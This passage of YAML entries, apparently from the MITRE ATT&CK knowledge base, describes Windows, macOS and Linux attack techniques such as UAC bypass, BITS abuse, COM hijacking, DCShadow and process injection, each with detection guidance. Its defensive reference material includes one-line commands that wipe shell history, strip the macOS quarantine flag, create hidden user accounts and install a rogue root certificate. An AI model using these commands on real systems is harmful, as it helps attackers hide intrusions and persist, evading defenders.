        Logging)\n\nIf an adversary is using a payload that calls the Windows token
        APIs directly, analysts can detect token manipulation only through careful
        analysis of user network activity, examination of running processes, and correlation
        with other endpoint and network behavior.  \n\nThere are many Windows API
        calls a payload can take advantage of to manipulate access tokens (e.g., <code>LogonUser</code>
        (Citation: Microsoft LogonUser), <code>DuplicateTokenEx</code> (Citation:
        Microsoft DuplicateTokenEx), and <code>ImpersonateLoggedOnUser</code> (Citation:
        Microsoft ImpersonateLoggedOnUser)).  Please see the referenced Windows API
        pages for more information.\n\nQuery systems for process and thread token
        information and look for inconsistencies such as user owns processes impersonating
        the local SYSTEM account. (Citation: BlackHat Atkinson Winchester Token Manipulation)\n\nPlatforms:

      description: |-
        Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM) (Citation: Microsoft COM). (Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

        The interface to create and manage BITS jobs is accessible through PowerShell  (Citation: Microsoft BITS) and the BITSAdmin tool. (Citation: Microsoft BITS)Admin

        Adversaries may abuse BITS to download, execute, and even clean up after malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. (Citation: CTU BITS Malware June 2016) (Citation: Mondok Windows PiggyBack BITS May 2007) (Citation: Symantec BITS May 2007) BITS enabled execution may also allow Persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). (Citation: PaloAlto UBoatRAT Nov 2017) (Citation: CTU BITS Malware June 2016)

        BITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol. (Citation: CTU BITS Malware June 2016)

        Detection: BITS runs as a service and its status can be checked with the Sc query utility (<code>sc query bits</code>). (Citation: Microsoft Issues with BITS July 2011) Active BITS tasks can be enumerated using the BITSAdmin tool (<code>bitsadmin /list /allusers /verbose</code>). (Citation: Microsoft BITS)

        Monitor usage of the BITSAdmin tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options)  (Citation: Microsoft BITS)Admin and the Windows Event log for BITS activity. Also consider investigating more detailed information about jobs by parsing the BITS job database. (Citation: CTU BITS Malware June 2016)

        Monitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account).

      name: Bypass User Account Control
      description: |-
        Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)

        If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. (Citation: Davidson Windows) Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.

        Many methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods (Citation: Github UACMe) that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

        * <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script. (Citation: enigma0x3 Fileless UAC Bypass) (Citation: Fortinet Fareit)

        Another bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity. (Citation: SANS UAC Bypass)

        Detection: There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of Process Injection and unusual loaded DLLs through DLL Search Order Hijacking, which indicate attempts to gain access to higher privileged processes.

        Some UAC bypass methods rely on modifying specific, user-accessible Registry settings.  For example:

        * The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Classes\mscfile\shell\open\command</code> Registry key. (Citation: enigma0x3 Fileless UAC Bypass)
        * The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe</code> and <code>[HKEY_CURRENT_USER]\Software\Classes\exefile\shell\runas\command\isolatedCommand</code> Registry keys. (Citation: enigma0x3 sdclt app paths) (Citation: enigma0x3 sdclt bypass)

        Analysts should monitor these Registry settings for unauthorized changes.

        The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.

        Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to Regsvr32 / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) This execution may also bypass AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft application.

      name: Clear Command History
      description: |-
        macOS and Linux both keep track of the commands users type in their terminal so that users can easily remember what they've done. These logs can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Since everything typed on the command-line is saved, passwords passed in on the command line are also saved. Adversaries can abuse this by searching these files for cleartext passwords. Additionally, adversaries can use a variety of methods to prevent their own commands from appear in these logs such as <code>unset HISTFILE</code>, <code>export HISTFILESIZE=0</code>, <code>history -c</code>, <code>rm ~/.bash_history</code>.

        Detection: User authentication, especially via remote terminal services like SSH, without new entries in that user's <code>~/.bash_history</code> is suspicious. Additionally, the modification of the HISTFILE and HISTFILESIZE environment variables or the removal/clearing of the <code>~/.bash_history</code> file are indicators of suspicious activity.

Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.

        Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

        Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).

        Detection: Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

      name: Component Object Model Hijacking
      description: |-
        The  (Citation: Microsoft Component Object Model) (COM) is a system within Windows to enable interaction between software components through the operating system. (Citation: Microsoft Component Object Model) Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. (Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.

        Detection: There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations replacing know binary paths with unknown paths. Even though some third party applications define user COM objects, the presence of objects within <code>HKEY_CURRENT_USER\Software\Classes\CLSID\</code> may be anomalous and should be investigated since user objects will be loaded prior to machine objects in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\</code>. (Citation: Endgame COM Hijacking) Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated. Likewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed.

      description: |-
        DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a Domain Controller (DC). (Citation: DCShadow Blog) (Citation: BlueHat DCShadow Jan 2018) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.

        Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)

        This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform SID-History Injection and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog) (Citation: BlueHat DCShadow Jan 2018)

        Detection: Monitor and analyze network traffic associated with data replication (such as calls to DrsAddEntry, DrsReplicaAdd, and especially GetNCChanges) between DCs as well as to/from non DC hosts. (Citation: GitHub DCSYNCMonitor) (Citation: DCShadow Blog) (Citation: BlueHat DCShadow Jan 2018) DC replication will naturally take place every 15 minutes but can be triggered by an attacker or by legitimate urgent changes (ex: passwords). (Citation: BlueHat DCShadow Jan 2018) Also consider monitoring and alerting on the replication of AD objects (Audit Detailed Directory Service Replication Events 4928 and 4929). (Citation: DCShadow Blog)

        Leverage AD directory synchronization (DirSync) to monitor changes to directory state using AD replication cookies. (Citation: Microsoft DirSync) (Citation: ADDSecurity DCShadow Feb 2018)

        Baseline and periodically analyze the Configuration partition of the AD schema and alert on creation of nTDSDSA objects. (Citation: BlueHat DCShadow Jan 2018)

        Investigate usage of Kerberos Service Principal Names (SPNs), especially those associated with services (beginning with “GC/”) by computers not present in the DC organizational unit (OU). The SPN associated with the Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235–4B06–11D1-AB04–00C04FC2DCD2) can be set without logging. (Citation: ADDSecurity DCShadow Feb 2018) A rogue DC must authenticate as a service using these two SPNs for the replication process to successfully complete.

      name: Deobfuscate/Decode Files or Information
      description: |-
        Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware, Scripting, PowerShell, or by using utilities present on the system.

        One such example is use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia)

        Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)

        Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used with Obfuscated Files or Information during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.

        Detection: Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as certutil.

        Monitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.

      name: File Deletion
      description: |-
        Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces behind as to what was done within a network and how. Adversaries may remove these files over the course of an intrusion to keep their footprint low or remove them at the end as part of the post-intrusion cleanup process.

        There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native cmd functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)

        Detection: It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.

      description: "In macOS and OS X, when applications or programs are downloaded
        from the internet, there is a special attribute set on the file called <code>com.apple.quarantine</code>.
        This attribute is read by Apple's Gatekeeper defense program at execution
        time and provides a prompt to the user to allow or deny execution. \n\nApps
        loaded onto the system from USB flash drive, optical disk, external hard drive,
        or even from a drive shared over the local network won’t set this flag. Additionally,
        other utilities or events like drive-by downloads don’t necessarily set it
        either. This completely bypasses the built-in Gatekeeper check. (Citation:
        Methods of Mac Malware Persistence) The presence of the quarantine flag can
        be checked by the xattr command <code>xattr /path/to/MyApp.app</code> for
        <code>com.apple.quarantine</code>. Similarly, given sudo access or elevated
        permission, this attribute can be removed with xattr as well, <code>sudo xattr
        -r -d com.apple.quarantine /path/to/MyApp.app</code>. (Citation: Clearing
        quarantine attribute) (Citation: OceanLotus for OS X)\n \nIn typical operation,
        a file will be downloaded from the internet and given a quarantine flag before
        being saved to disk. When the user tries to open the file or application,
        macOS’s gatekeeper will step in and check for the presence of this flag. If
        it exists, then macOS will then prompt the user to confirmation that they
        want to run the program and will even provide the URL where the application
        came from. However, this is all based on the file being downloaded from a
        quarantine-savvy application. (Citation: Bypassing Gatekeeper)\n\nDetection:
        Monitoring for the removal of the <code>com.apple.quarantine</code> flag by
        a user instead of the operating system is a suspicious action and should be

      name: HISTCONTROL
      description: |-
        The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to "ignorespace". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to "ignoredups". In some Linux systems, this is set by default to "ignoreboth" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.

        Detection: Correlating a user session with a distinct lack of new commands in their <code>.bash_history</code> can be a clue to suspicious behavior. Additionally, users checking or changing their <code>HISTCONTROL</code> environment variable is also suspicious.

      name: Hidden Files and Directories
      description: "To prevent normal users from accidentally changing special files
        on a system, most operating systems have the concept of a ‘hidden’ file. These
        files don’t show up when a user browses the file system with a GUI or when
        using normal commands on the command line. Users must explicitly ask to show
        the hidden files either via a series of Graphical User Interface (GUI) prompts
        or with command line switches (<code>dir /a</code> for Windows and <code>ls
        –a</code> for Linux and macOS).\n\n===Windows===\n\nUsers can mark specific
        files as hidden by using the attrib.exe binary. Simply do <code>attrib +h
        filename</code> to mark a file or folder as hidden. Similarly, the “+s” marks
        a file as a system file and the “+r” flag marks the file as read only. Like
        most windows binaries, the attrib.exe binary provides the ability to apply
        these changes recursively “/S”.\n\n===Linux/Mac===\n\nUsers can mark specific
        files as hidden simply by putting a “.” as the first character in the file
        or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac
        Malware). Files and folder that start with a period, ‘.’, are by default hidden
        from being viewed in the Finder application and standard command-line utilities
        like “ls”. Users must specifically change settings to have these files viewable.
        For command line usages, there is typically a flag to see all files (including
        hidden ones). To view these files in the Finder Application, the following
        command must be executed: <code>defaults write com.apple.finder AppleShowAllFiles
        YES</code>, and then relaunch the Finder Application.\n\n===Mac===\n\nFiles
        on macOS can be marked with the UF_HIDDEN flag which prevents them from being
        seen in Finder.app, but still allows them to be seen in Terminal.app (Citation:
        WireLurker).\nMany applications create these hidden files and folders to store
        information so that it doesn’t clutter up the user’s workspace. For example,
        SSH utilities create a .ssh folder that’s hidden and contains the user’s known
        hosts and keys. \n\nAdversaries can use this to their advantage to hide files
        and folders anywhere on the system for persistence and evading a typical user
        or system analysis that does not incorporate investigation of hidden files.\n\nDetection:
        Monitor the file system and shell commands for files being created with a
        leading \".\" and the Windows command-line use of attrib.exe to add the hidden
        attribute.\n\nPlatforms: Linux, macOS, Windows\n\nData Sources: File monitoring,

      name: Hidden Users
      description: |-
        Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account. There is a property value in <code>/Library/Preferences/com.apple.loginwindow</code> called <code>Hide500Users</code> that prevents users with userIDs 500 and lower from appearing at the login screen. By using the Create Account technique with a userID under 500 and enabling this property (setting it to Yes), an adversary can hide their user accounts much more easily: <code>sudo dscl . -create /Users/username UniqueID 401</code> (Citation: Cybereason OSX Pirrit).

        Detection: This technique prevents the new user from showing up at the log in screen, but all of the other signs of a new user still exist. The user still gets a home directory and will appear in the authentication logs.

    technique:
      name: Image File Execution Options Injection
      description: |-
        Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, any executable file present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., “C:\dbg\ntsd.exe -g  notepad.exe”). (Citation: Microsoft Dev Blog IFEO Mar 2010)

        IFEOs can be set directly via the Registry or in Global Flags via the Gflags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as Debugger Values in the Registry under <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options/<executable></code> and <code> HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable> </code> where <code><executable></code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)

        Similar to Process Injection, this value can be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Engame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation.

        Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)

        Detection: Monitor for common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as <code>DEBUG_PROCESS</code> and <code>DEBUG_ONLY_THIS_PROCESS</code>. (Citation: Microsoft Dev Blog IFEO Mar 2010)

        Monitor the IFEOs Registry value for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx.

        Adversaries may delete or alter generated event files on a host system, including potentially captured files such as quarantined malware.

        Various Windows utilities may be used to execute commands, possibly without invoking cmd. For example, Forfiles, the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a Command-Line Interface, Run window, or via scripts.  (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)

        Adversaries may abuse these utilities for Defense Evasion, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of cmd.

        Detection: Monitor and analyze logs from host-based detection mechanisms, such as Sysmon, for events such as process creations that include or are resulting from parameters associated with invoking programs/commands and/or spawning child processes. (Citation: RSA Forfiles Aug 2017)

      name: Install Root Certificate
      description: |-
        Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.

        Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)

        Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)

        Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)

        In macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)

        Detection: A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity. (Citation: SpectorOps Code Signing Dec 2017) Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and through authroot.stl. (Citation: SpectorOps Code Signing Dec 2017) The Sysinternals Sigcheck utility can also be used (<code>sigcheck[64].exe -tuv</code>) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List. (Citation: Microsoft Sigcheck May 2017)

        Installed root certificates are located in the Registry under <code>HKLM\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates\</code> and <code>[HKLM or HKCU]\Software[\Policies\]\Microsoft\SystemCertificates\Root\Certificates\</code>. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison: (Citation: Tripwire AppUNBlocker)

        InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil is located in the .NET directories on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>. InstallUtil.exe is digitally signed by Microsoft.

        Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: SubTee GitHub All The Things Application Whitelisting Bypass)

        Detection: Use process monitoring to monitor the execution and arguments of InstallUtil.exe. Compare recent invocations of InstallUtil.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the InstallUtil.exe invocation may also be useful in determining the origin and purpose of the binary being executed.

      description: |-
        Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.  Several different variations of this technique have been observed.

        One variant is for an executable to be placed in a commonly trusted directory or given the name of a legitimate, trusted program.  Alternatively, the filename given may be a close approximation of legitimate programs.  This is done to bypass tools that trust executables by relying on file name or path, as well as to deceive defenders and system administrators into thinking a file is benign by associating the name with something that is thought to be legitimate.


        ===Windows===
        In another variation of this technique, an adversary may use a renamed copy of a legitimate utility, such as rundll32.exe. (Citation: Endgame Masquerade Ball) An alternative case occurs when a legitimate utility is moved to a different directory and also renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke)

        An example of abuse of trusted locations in Windows would be the <code>C:\Windows\System32</code> directory.  Examples of trusted binary names that can be given to malicious binares include "explorer.exe" and "svchost.exe".

        ===Linux===
        Another variation of this technique includes malicious binaries changing the name of their running process to that of a trusted or benign process, after they have been launched as opposed to before.  (Citation: Remaiten)

        An example of abuse of trusted locations in Linux  would be the <code>/bin</code> directory.  Examples of trusted binary names that can be given to malicious binares include "rsyncd" and "dbus-inotifier".   (Citation: Fysbis Palo Alto Analysis)  (Citation: Fysbis Dr Web Analysis)

        Detection: Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.

        If file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity. (Citation: Endgame Masquerade Ball)

      name: Modify Registry
      description: |-
        Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in Persistence and Execution.

        Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API (see examples).

        The Registry of a remote system may be modified to aid in execution of files as part of Lateral Movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often Valid Accounts are required, along with access to the remote system's Windows Admin Shares for RPC communication.

        Detection: Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.

        Monitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell, which may require additional logging features to be configured in the operating system to collect necessary information for analysis.

      description: |-
        Windows shared drive and Windows Admin Shares connections can be removed when no longer needed. Net is an example utility that can be used to remove network share connections with the <code>net use \\system\share /delete</code> command. (Citation: Technet Net Use)

        Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation.

        Detection: Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of Windows Admin Shares. SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.

        Platforms: Windows

        Data Sources: Process monitoring, Process command-line parameters, Packet capture, Authentication logs

        Defense Bypassed: Host forensic analysis

        Permissions Required: User, Administrator

        System Requirements: Established network share connection to a remote system. Level of access depends on permissions of the account used.

      name: Obfuscated Files or Information
      description: |-
        Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

        Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.

        Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

        Adversaries may also obfuscate commands executed from payloads or directly via a Command-Line Interface. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and whitelisting mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: PaloAlto EncodedCommand March 2017)

        Another example of obfuscation is through the use of steganography, a technique of hiding messages or code in images, audio tracks, video clips, or text files. One of the first known and reported adversaries that used steganography activity surrounding Invoke-PSImage. The Duqu malware encrypted the gathered information from a victim's system and hid it into an image followed by exfiltrating the image to a C2 server. (Citation: Wikipedia Duqu) By the end of 2017, an adversary group used Invoke-PSImage to hide PowerShell commands in an image file (png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary. (Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)

        Detection: Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).

        Flag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016)

        Obfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection.

      name: Process Injection
      description: |-
        Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

        ===Windows===

        There are multiple approaches to injecting code into a live process. Windows implementations include: (Citation: Engame Process Injection July 2017)
        * '''Dynamic-link library (DLL) injection''' involves writing the path to a malicious DLL inside a process then invoking execution by creating a remote thread.
        * '''Portable executable injection''' involves writing malicious code directly into the process (without a file on disk) then invoking execution with either additional code or by creating a remote thread. The displacement of the injected code introduces the additional requirement for functionality to remap memory references. Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue. (Citation: Endgame HuntingNMemory June 2017)
        * '''Thread execution hijacking''' involves injecting malicious code or the path to a DLL into a thread of a process. Similar to Process Hollowing, the thread must first be suspended.
